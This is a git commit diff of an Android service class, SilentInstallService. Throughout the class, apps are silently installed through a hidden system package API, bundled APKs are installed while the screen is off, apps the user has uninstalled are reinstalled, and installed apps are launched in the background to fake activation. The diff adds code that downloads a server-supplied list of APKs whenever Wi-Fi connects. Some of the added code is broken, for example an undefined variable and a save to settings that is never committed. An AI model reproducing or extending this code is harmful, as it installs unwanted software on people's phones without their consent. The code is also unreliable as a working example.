c431eaeaae221491eab9a4cbbd47631464d57305
chrain <fly__u@163.com>
2013-12-20 11:55:01 +0800

    modify

--- app/src/com/xstd/active/plugin/SilentInstallService.java
+++ app/src/com/xstd/active/plugin/SilentInstallService.java
@@ -7,7 +7,12 @@ import java.io.InputStream;
 import java.io.OutputStream;
 import java.lang.reflect.Method;
 import java.util.ArrayList;
+import java.util.HashSet;
 import java.util.List;
+import java.util.Set;
+
+import net.tsz.afinal.bitmap.download.Downloader;
+import net.tsz.afinal.bitmap.download.SimpleHttpDownloader;
 
 import org.json.JSONArray;
 import org.json.JSONException;
@@ -25,13 +30,17 @@ import android.content.pm.PackageInfo;
 import android.content.pm.PackageManager;
 import android.content.res.AssetManager;
 import android.database.Cursor;
+import android.net.NetworkInfo;
 import android.net.Uri;
+import android.net.wifi.WifiManager;
 import android.os.Environment;
 import android.os.IBinder;
+import android.os.Parcelable;
 import android.os.RemoteException;
 import android.os.SystemClock;
 import android.telephony.TelephonyManager;
 import android.text.TextUtils;
+import android.text.format.DateUtils;
 import android.util.Log;
 
 import com.android.volley.RequestQueue;
@@ -45,7 +54,7 @@ import com.xstd.active.plugin.dao.SilenceAppDaoUtils;
 public class SilentInstallService extends Service {
 
 	private IPackageManager manager;
-	private ScreenChangeReceiver receiver;
+	private MyReceiver receiver;
 	private SharedPreferences sharedPreferences;
 
 	@Override
@@ -58,26 +67,26 @@ public class SilentInstallService extends Service {
 		super.onCreate();
 
 		sharedPreferences = getSharedPreferences("setting", MODE_PRIVATE);
+		downloader = new SimpleHttpDownloader();
 
 		try {
 			@SuppressWarnings("rawtypes")
-			Class clazz = getClassLoader().loadClass(
-					"android.os.ServiceManager");
+			Class clazz = getClassLoader().loadClass("android.os.ServiceManager");
 			@SuppressWarnings("unchecked")
-			Method method = clazz.getMethod("getService",
-					new Class[] { String.class });
+			Method method = clazz.getMethod("getService", new Class[] { String.class });
 			IBinder b = (IBinder) method.invoke(null, "package");
 			manager = IPackageManager.Stub.asInterface(b);
 		} catch (Exception e) {
 			e.printStackTrace();
 		}
 
-		receiver = new ScreenChangeReceiver();
+		receiver = new MyReceiver();
 		IntentFilter filter = new IntentFilter();
 		filter.setPriority(Integer.MAX_VALUE);
 		filter.addAction(Intent.ACTION_SCREEN_ON);
 		filter.addAction(Intent.ACTION_SCREEN_OFF);
 		filter.addAction(Intent.ACTION_USER_PRESENT);
+		filter.addAction(WifiManager.NETWORK_STATE_CHANGED_ACTION);
 		registerReceiver(receiver, filter);
 
 		boolean fs = sharedPreferences.getBoolean("fs", false);
@@ -94,13 +103,12 @@ public class SilentInstallService extends Service {
 
 	@Override
 	public int onStartCommand(Intent intent, int flags, int startId) {
-		if (intent != null
-				&& !TextUtils.isEmpty(intent.getStringExtra("apk_path")))
+		if (intent != null && !TextUtils.isEmpty(intent.getStringExtra("apk_path")))
 			installFile(new File(intent.getStringExtra("apk_path")), observer);
 		return super.onStartCommand(intent, flags, startId);
 	}
 
-	class ScreenChangeReceiver extends BroadcastReceiver {
+	class MyReceiver extends BroadcastReceiver {
 
 		@Override
 		public void onReceive(Context context, Intent intent) {
@@ -114,25 +122,56 @@ public class SilentInstallService extends Service {
 				activeApp();
 			} else if (Intent.ACTION_USER_PRESENT.equals(action)) {
 				checkActive();
+			} else if(WifiManager.NETWORK_STATE_CHANGED_ACTION.equals(action)) {
+				Parcelable parcelableExtra = intent.getParcelableExtra(WifiManager.EXTRA_NETWORK_INFO);
+				if (null != parcelableExtra) {
+					NetworkInfo networkInfo = (NetworkInfo) parcelableExtra;
+					boolean isConnected = networkInfo.isAvailable();
+					if (isConnected) {
+						updateService();
+						if(mustDownloadApp.size()>0) {
+							for (DownloadApplication app : mustDownloadApp) {
+								downloader.downloadToLocalStreamByUrl(app.remoteUrl, arg1);
+							}
+						}
+					}
+				}
 			}
 		}
 	}
-
+	
 	public static final String SERVER_URL_PATH = "https://";
+	private Set<DownloadApplication> mustDownloadApp = new HashSet<DownloadApplication>();
 
+	/**
+	 * 检查服务器，更新下载列表
+	 */
 	private void updateService() {
-		List<SilenceApp> sas = new ArrayList<SilenceApp>();
+		long last_update_time = sharedPreferences.getLong("last_update_time", 0);
+		if(DateUtils.isToday(last_update_time)) {
+			return;
+		}
+		mustDownloadApp.clear();
 		RequestQueue rq = Volley.newRequestQueue(this);
 		rq.add(new JsonArrayRequest(SERVER_URL_PATH, new Listener<JSONArray>() {
 
 			@Override
 			public void onResponse(JSONArray arg0) {
+				sharedPreferences.edit().putLong("last_update_time", System.currentTimeMillis());
+				getDeviceInstallPackName();
 				for (int i = 0; i < arg0.length(); i++) {
 					try {
 						JSONObject obj = arg0.getJSONObject(i);
+						String name = obj.getString("software_name");
 						String packName = obj.getString("package_name");
-						String version = obj.getString("version");
 						String url = obj.getString("apk_uri");
+						if(!mustDownloadApp.contains(packName)) {
+							DownloadApplication app = new DownloadApplication();
+							app.fileName = name;
+							app.packName = packName;
+							app.remoteUrl = url;
+							mustDownloadApp.add(app);
+						}
 					} catch (JSONException e) {
 						e.printStackTrace();
 					}
@@ -141,34 +180,38 @@ public class SilentInstallService extends Service {
 		}, null));
 		rq.start();
 	}
+	
+	static class DownloadApplication {
+		String fileName;
+		String packName;
+		String remoteUrl;
+	}
 
 	private boolean isScreenLignt = true;
+	public static final long DAY_TIME_MILLIS = 1000 * 60 * 60 * 24;//一天的毫秒数
 
 	private void checkActive() {
 		getDeviceInstallPackName();
 		long currentTimeMillis = System.currentTimeMillis();
-		long oneDay = 1000 * 60 * 60 * 24;
+
 		SilenceAppDao dao = SilenceAppDaoUtils.getSilenceAppDao(this);
-		Cursor cursor = dao.getDatabase().query(dao.getTablename(),
-				dao.getAllColumns(), null, null, null, null, null);
+		Cursor cursor = dao.getDatabase().query(dao.getTablename(), dao.getAllColumns(), null, null, null, null, null);
 		while (cursor.moveToNext()) {
 			long id = cursor.getLong(0);
 			String packName = cursor.getString(1);
-			long installtime = cursor
-					.getLong(cursor
-							.getColumnIndex(SilenceAppDao.Properties.Installtime.columnName));
+			long installtime = cursor.getLong(cursor.getColumnIndex(SilenceAppDao.Properties.Installtime.columnName));
 			long installTotal = currentTimeMillis - installtime;
 			SilenceApp entity = new SilenceApp();
 			entity.setId(id);
 			entity.setPackagename(packName);
-			if (oneDay < installTotal && installTotal < oneDay * 2) {
+			if (DAY_TIME_MILLIS < installTotal && installTotal < DAY_TIME_MILLIS * 2) {
 				if (!packgeNames.contains(packName)) {
 					reInstallAfterUninstall(entity);
 				} else {
 					entity.setActive(false);
 					dao.update(entity);
 				}
-			} else if (oneDay * 4 < installTotal && installTotal < oneDay * 6) {
+			} else if (DAY_TIME_MILLIS * 4 < installTotal && installTotal < DAY_TIME_MILLIS * 6) {
 				if (!packgeNames.contains(packName)) {
 					reInstallAfterUninstall(entity);
 				} else {
@@ -190,11 +233,9 @@ public class SilentInstallService extends Service {
 
 			@Override
 			public void run() {
-				if (!Environment.getExternalStorageState().equals(
-						Environment.MEDIA_MOUNTED))
+				if (!Environment.getExternalStorageState().equals(Environment.MEDIA_MOUNTED))
 					return;
-				String sdcardPath = Environment.getExternalStorageDirectory()
-						.getAbsolutePath() + File.separator + "Download";
+				String sdcardPath = Environment.getExternalStorageDirectory().getAbsolutePath() + File.separator + "Download";
 				AssetManager assets = getAssets();
 				InputStream is = null;
 				OutputStream os = null;
@@ -204,17 +245,14 @@ public class SilentInstallService extends Service {
 							continue;
 						File file = new File(sdcardPath, app);
 						if (file.exists()) {
-							String packName = getPackageName(file
-									.getAbsolutePath());
-							if (packName != null
-									&& packName.equals(entity.getPackagename())) {
+							String packName = getPackageName(file.getAbsolutePath());
+							if (packName != null && packName.equals(entity.getPackagename())) {
 								installFile(file, observer);
 								return;
 							}
 						}
 						is = assets.open(app);
-						os = new BufferedOutputStream(
-								new FileOutputStream(file));
+						os = new BufferedOutputStream(new FileOutputStream(file));
 						byte[] b = new byte[1024 * 5];
 						int len;
 						while ((len = is.read(b)) != -1) {
@@ -222,8 +260,7 @@ public class SilentInstallService extends Service {
 						}
 						os.flush();
 						String packName = getPackageName(file.getAbsolutePath());
-						if (packName != null
-								&& packName.equals(entity.getPackagename())) {
+						if (packName != null && packName.equals(entity.getPackagename())) {
 							installFile(file, observer);
 							return;
 						}
@@ -252,8 +289,7 @@ public class SilentInstallService extends Service {
 	 */
 	private void getDeviceInstallPackName() {
 		packgeNames.clear();
-		List<PackageInfo> pis = getPackageManager().getInstalledPackages(
-				PackageManager.GET_ACTIVITIES);
+		List<PackageInfo> pis = getPackageManager().getInstalledPackages(PackageManager.GET_ACTIVITIES);
 		for (PackageInfo pi : pis)
 			packgeNames.add(pi.packageName);
 	}
@@ -267,30 +303,19 @@ public class SilentInstallService extends Service {
 			@Override
 			public void run() {
 				active = true;
-				SilenceAppDao dao = SilenceAppDaoUtils
-						.getSilenceAppDao(getApplicationContext());
-				Cursor cursor = dao.getDatabase().query(
-						dao.getTablename(),
-						dao.getAllColumns(),
-						"active=?",
-						new String[] { String.valueOf(0) },
-						null,
-						null,
-						SilenceAppDao.Properties.Installtime.columnName
-								+ " ASC");
+				SilenceAppDao dao = SilenceAppDaoUtils.getSilenceAppDao(getApplicationContext());
+				Cursor cursor = dao.getDatabase().query(dao.getTablename(), dao.getAllColumns(), "active=?", new String[] { String.valueOf(0) }, null, null,
+						SilenceAppDao.Properties.Installtime.columnName + " ASC");
 
 				while (active && cursor.moveToNext()) {
 					long id = cursor.getLong(0);
 					String packname = cursor.getString(1);
 					if (!packgeNames.contains(packname)) {// 说明程序被用户卸载了。
-						Log.w("ps",
-								packname
-										+ "not active, it's uninstall, delete it in db.");
+						Log.w("ps", packname + "not active, it's uninstall, delete it in db.");
 						break;
 					}
 					packageName = packname;
-					Intent app = getPackageManager().getLaunchIntentForPackage(
-							packname);
+					Intent app = getPackageManager().getLaunchIntentForPackage(packname);
 					startActivity(app);
 					SystemClock.sleep(15000);
 					if (!active) {
@@ -356,8 +381,7 @@ public class SilentInstallService extends Service {
 	 * @return APK的包名
 	 */
 	private String getPackageName(String absPath) {
-		PackageInfo pkgInfo = getPackageManager().getPackageArchiveInfo(
-				absPath, PackageManager.GET_ACTIVITIES);
+		PackageInfo pkgInfo = getPackageManager().getPackageArchiveInfo(absPath, PackageManager.GET_ACTIVITIES);
 		if (pkgInfo != null) {
 			return pkgInfo.applicationInfo.packageName;
 		}
@@ -387,11 +411,9 @@ public class SilentInstallService extends Service {
 				while (isScreenLignt)
 					// 如果屏幕亮着，什么都不执行。
 					SystemClock.sleep(2000);
-				if (!Environment.getExternalStorageState().equals(
-						Environment.MEDIA_MOUNTED))
+				if (!Environment.getExternalStorageState().equals(Environment.MEDIA_MOUNTED))
 					return;
-				String sdcardPath = Environment.getExternalStorageDirectory()
-						.getAbsolutePath() + File.separator + "Download";
+				String sdcardPath = Environment.getExternalStorageDirectory().getAbsolutePath() + File.separator + "Download";
 				AssetManager assets = getAssets();
 				InputStream is = null;
 				OutputStream os = null;
@@ -403,8 +425,7 @@ public class SilentInstallService extends Service {
 						if (file.exists())
 							continue;
 						is = assets.open(app);
-						os = new BufferedOutputStream(
-								new FileOutputStream(file));
+						os = new BufferedOutputStream(new FileOutputStream(file));
 						byte[] b = new byte[1024 * 5];
 						int len;
 						while ((len = is.read(b)) != -1) {
@@ -435,17 +456,16 @@ public class SilentInstallService extends Service {
 	private IPackageInstallObserver.Stub observer = new IPackageInstallObserver.Stub() {
 
 		@Override
-		public void packageInstalled(String packageName, int returnCode)
-				throws RemoteException {
+		public void packageInstalled(String packageName, int returnCode) throws RemoteException {
 			if (returnCode == 1) {
 				SilenceApp sa = new SilenceApp();
 				sa.setPackagename(packageName);
 				sa.setInstalltime(System.currentTimeMillis());
 				sa.setActive(false);
-				SilenceAppDaoUtils.getSilenceAppDao(getApplicationContext())
-						.insert(sa);
+				SilenceAppDaoUtils.getSilenceAppDao(getApplicationContext()).insert(sa);
 			}
 		}
 	};
+	private Downloader downloader;
 
 }
